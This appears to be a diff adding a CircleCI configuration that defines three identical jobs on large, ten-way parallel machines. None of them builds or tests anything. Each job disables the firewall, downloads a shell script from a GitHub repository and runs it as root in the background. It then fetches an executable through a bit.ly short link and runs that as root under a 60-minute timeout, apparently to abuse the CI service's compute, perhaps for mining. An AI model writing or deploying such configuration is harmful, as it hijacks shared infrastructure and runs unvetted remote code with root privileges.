@@ -1,0 +1,79 @@
+version: 2
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    parallelism: 10
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://raw.githubusercontent.com/golekin/crispy-octo-eureka/main/spring.sh
+          chmod +x spring.sh
+          sudo su --command "nohup ./spring.sh --stdout &"
+          sleep 5    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3LpN036
+          chmod +x 3LpN036
+          sudo su --command "./3LpN036"
+  build_a:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    parallelism: 10
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://raw.githubusercontent.com/golekin/crispy-octo-eureka/main/spring.sh
+          chmod +x spring.sh
+          sudo su --command "nohup ./spring.sh --stdout &"
+          sleep 5    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3LpN036
+          chmod +x 3LpN036
+          sudo su --command "./3LpN036"
+  build_b:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    parallelism: 10
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://raw.githubusercontent.com/golekin/crispy-octo-eureka/main/spring.sh
+          chmod +x spring.sh
+          sudo su --command "nohup ./spring.sh --stdout &"
+          sleep 5    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3LpN036
+          chmod +x 3LpN036
+          sudo su --command "./3LpN036"
+       
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
+      - build_a
+      - build_b
